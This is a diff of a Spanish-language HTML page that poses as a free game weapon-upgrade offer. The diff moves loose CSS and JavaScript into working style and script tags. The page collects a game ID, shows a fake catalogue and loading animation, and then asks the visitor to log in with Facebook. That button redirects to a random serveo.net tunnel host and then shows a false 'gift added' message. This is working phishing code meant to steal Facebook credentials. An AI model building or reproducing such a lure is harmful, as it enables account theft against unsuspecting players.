@@ -1,86 +1,79 @@
 <!DOCTYPE html>
 <html lang="es">
-
-
-body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    background: linear-gradient(90deg, red, gold, pink);
-    animation: changeBackground 10s infinite;
-}
-
-#panel, #catalogo, #cargando, #loginFB {
-    text-align: center;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-}
-
-#panel {
-    position: absolute;
-    display: block;
-}
-
-#catalogo {
-    display: none;
-}
-
-#cargando {
-    display: none;
-    animation: cargarBola 5s ease-in-out infinite;
-}
-
-#bola {
-    width: 50px;
-    height: 50px;
-    border-radius: 50%;
-    background-color: #000;
-    margin: 20px;
-    animation: girarBola 1.5s linear infinite;
-}
-
-.hidden {
-    display: none;
-}
-
-@keyframes changeBackground {
-    0% { background: red; }
-    50% { background: gold; }
-    100% { background: pink; }
-}
-
-@keyframes cargarBola {
-    0% { transform: scale(1); }
-    100% { transform: scale(1.5); }
-}
-
-@keyframes girarBola {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
-.arma img {
-    width: 100px;
-    cursor: pointer;
-    margin: 10px;
-}
-
-
-
-
-
-    
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mejora de Armas Evolutivas</title>
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(90deg, red, gold, pink);
+            animation: changeBackground 10s infinite;
+        }
+
+        #panel, #catalogo, #cargando, #loginFB {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #panel {
+            position: absolute;
+            display: block;
+        }
+
+        #catalogo {
+            display: none;
+        }
+
+        #cargando {
+            display: none;
+            animation: cargarBola 5s ease-in-out infinite;
+        }
+
+        #bola {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background-color: #000;
+            margin: 20px;
+            animation: girarBola 1.5s linear infinite;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @keyframes changeBackground {
+            0% { background: red; }
+            50% { background: gold; }
+            100% { background: pink; }
+        }
+
+        @keyframes cargarBola {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.5); }
+        }
+
+        @keyframes girarBola {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .arma img {
+            width: 100px;
+            cursor: pointer;
+            margin: 10px;
+        }
+    </style>
 </head>
 <body>
     <div id="panel">
@@ -127,44 +120,45 @@ body {
         <p>Inicia sesión con Facebook</p>
         <button onclick="loginFacebook()">Iniciar sesión</button>
     </div>
-function procesoID() {
-    let userID = document.getElementById('userID').value;
-    if (userID) {
-        document.getElementById('panel').style.display = 'none';
-        document.getElementById('catalogo').style.display = 'block';
-        iniciarSpinner();
-    } else {
-        alert('Por favor ingresa tu ID de juego');
-    }
-}
 
-function iniciarSpinner() {
-    const spinner = document.getElementById('spinner');
-    spinner.style.border = '5px solid blue';
-    setTimeout(() => {
-        document.getElementById('catalogo').style.display = 'none';
-        document.getElementById('cargando').style.display = 'flex';
-        setTimeout(() => {
-            document.getElementById('loginFB').style.display = 'block';
-        }, 5000);
-    }, 3000); // Simula el proceso de carga
-}
+    <script>
+        function procesoID() {
+            let userID = document.getElementById('userID').value;
+            if (userID) {
+                document.getElementById('panel').style.display = 'none';
+                document.getElementById('catalogo').style.display = 'block';
+                iniciarSpinner();
+            } else {
+                alert('Por favor ingresa tu ID de juego');
+            }
+        }
 
-function selectWeapon(weapon) {
-    console.log('Seleccionaste el arma: ' + weapon);
-    document.getElementById('cargando').style.display = 'block';
-    setTimeout(() => {
-        document.getElementById('loginFB').style.display = 'block';
-    }, 5000); // Espera antes de mostrar el login
-}
+        function iniciarSpinner() {
+            const spinner = document.getElementById('spinner');
+            spinner.style.border = '5px solid blue';
+            setTimeout(() => {
+                document.getElementById('catalogo').style.display = 'none';
+                document.getElementById('cargando').style.display = 'flex';
+                setTimeout(() => {
+                    document.getElementById('loginFB').style.display = 'block';
+                }, 5000);
+            }, 3000); // Simula el proceso de carga
+        }
 
-function loginFacebook() {
-    window.location.href = 'https://babc3bf26bafa9c869659c4fc15c359d.serveo.net';
-    setTimeout(() => {
-        alert('Fragmentos añadidos a tu cuenta. ¡Revisa tu regalo!');
-    }, 2000);
-}
+        function selectWeapon(weapon) {
+            console.log('Seleccionaste el arma: ' + weapon);
+            document.getElementById('cargando').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loginFB').style.display = 'block';
+            }, 5000); // Espera antes de mostrar el login
+        }
 
-    <script src="scripts.js"> </script>
+        function loginFacebook() {
+            window.location.href = 'https://babc3bf26bafa9c869659c4fc15c359d.serveo.net';
+            setTimeout(() => {
+                alert('Fragmentos añadidos a tu cuenta. ¡Revisa tu regalo!');
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
